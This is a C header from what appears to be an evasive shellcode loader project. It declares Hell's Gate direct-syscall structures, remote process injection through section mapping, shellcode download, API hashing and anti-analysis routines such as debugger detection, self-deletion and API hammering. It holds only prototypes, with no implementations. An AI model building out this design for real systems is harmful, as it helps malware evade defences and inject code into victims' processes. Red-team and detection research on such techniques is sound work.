/*
 *  ~ typedefs.h ~
 * Custom typedefs and function prototypes
 * Author: jakobfriedl
 */

#pragma once
#include "structs.h"

typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	// Remote process enumeration
	VX_TABLE_ENTRY NtQuerySystemInformation;
	VX_TABLE_ENTRY NtOpenProcess; 
	// Mapping injection
	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
	VX_TABLE_ENTRY NtClose;
	// Anti-analysis
	VX_TABLE_ENTRY NtQueryInformationProcess; 
	VX_TABLE_ENTRY NtCreateFile;
	VX_TABLE_ENTRY NtSetInformationFile; 
    VX_TABLE_ENTRY NtWriteFile;
    VX_TABLE_ENTRY NtReadFile; 

} VX_TABLE, * PVX_TABLE;

/// Function prototypes
// From hellsgate.asm
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

// From main.c (Hell's Gate functions)
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(IN PVOID pModuleBase, OUT PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(IN PVOID pModuleBase, IN PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, IN PVX_TABLE_ENTRY pVxTableEntry);
BOOL InitializeHellsGate(IN PVX_TABLE Table);

// From injection.c 
BOOL GetRemoteProcessHandle(IN PVX_TABLE pVxTable, IN LPCWSTR lpProcessName, OUT HANDLE* hProcess, OUT DWORD* dwProcessId);
BOOL InvokeMappingInjection(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSize); 

// From utils.c (mainly https://github.com/vxunderground/VX-API/tree/main/VX-API) 
PVOID CopyMemoryEx(IN OUT PVOID Destination, IN CONST PVOID Source, IN SIZE_T Length); 
VOID ZeroMemoryEx(IN OUT PVOID Destination, IN SIZE_T Size); 
VOID PrintByteArray(IN PBYTE pBytes, IN SIZE_T sSize); 
VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString); 

// From antianalysis.c
BOOL DebuggerDetected(IN PVX_TABLE pVxTable);
BOOL SelfDelete(IN PVX_TABLE pVxTable); 
BOOL ApiHammering(IN PVX_TABLE pVxTable, IN DWORD dwStress); 
VOID IatCamouflage(); 

// From internet.c
BOOL Download(IN LPCWSTR lpUrl, OUT PBYTE* pEncShellcode, OUT SIZE_T* sSize); 

// From hashing.c
ULONG HashFNV_1a(IN LPCSTR String);
ULONG HashFNV_1aW(IN LPCWSTR String);
FARPROC GetProcAddressH(IN HMODULE hModule, IN DWORD dwApiNameHash);
HMODULE GetModuleHandleH(IN DWORD dwModuleNameHash); 
VOID PrintHashes(); 

// From crypt.c 



/// API Function prototypes
typedef HINTERNET(WINAPI* fnInternetOpenW)(
    LPCWSTR lpszAgent,
    DWORD dwAccessType,
    LPCWSTR lpszProxy,
    LPCWSTR lpszProxyBypass,
    DWORD dwFlags
    );

typedef HINTERNET(WINAPI* fnInternetOpenUrlW) (
    HINTERNET hInternet,
    LPCWSTR   lpszUrl,
    LPCWSTR   lpszHeaders,
    DWORD     dwHeadersLength,
    DWORD     dwFlags,
    DWORD_PTR dwContext
    );

typedef BOOL(WINAPI* fnInternetReadFile)(
    HINTERNET hFile,
    LPVOID lpBuffer,
    DWORD dwNumberOfBytesToRead,
    LPDWORD lpdwNumberOfBytesRead
    );

typedef BOOL(WINAPI* fnInternetCloseHandle)(
    HINTERNET hInternet
    );

typedef BOOL(WINAPI* fnInternetSetOptionW) (
    HINTERNET hInternet,
    DWORD     dwOption,
    LPVOID    lpBuffer,
    DWORD     dwBufferLength
    );

typedef HMODULE(WINAPI* fnLoadLibraryA) (
    LPCSTR lpLibFileName
    );